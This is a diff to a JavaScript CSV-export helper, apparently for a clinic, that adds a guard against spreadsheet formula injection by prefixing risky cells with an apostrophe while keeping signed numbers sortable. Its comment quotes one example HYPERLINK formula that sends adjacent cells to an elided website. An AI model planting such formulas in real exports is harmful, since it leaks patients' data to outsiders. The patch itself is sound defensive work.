@@ -15,10 +15,20 @@
 "use strict";
 
 
-/* ── CSV core (RFC-4180-ish): quote fields with comma/quote/newline ── */
+/* ── CSV core (RFC-4180-ish): quote fields with comma/quote/newline ──
+
+   Spreadsheet FORMULA INJECTION: a cell that starts with = + - @ (or a tab /
+   carriage return) is executed as a formula when the file is opened in
+   Excel, LibreOffice or Sheets. A patient name or complaint typed — or
+   restored from a crafted backup — as =HYPERLINK("https://…?"&A2,"x") sends
+   the neighbouring cells to a website the moment someone clicks it. Such a
+   cell is prefixed with an apostrophe so it opens as text (OWASP guidance).
+   A plain number keeps its sign — "-3.00" is a sphere, not a formula, and
+   must stay a number the clinic can sort and compute with. */
 function csvCell(v) {
   if (v == null) return "";
   var s = String(v);
+  if (/^[=+\-@\t\r]/.test(s) && !/^[+-]?(\d+\.?\d*|\.\d+)$/.test(s)) s = "'" + s;
   if (/[",\n\r]/.test(s)) return '"' + s.replace(/"/g, '""') + '"';
   return s;
 }
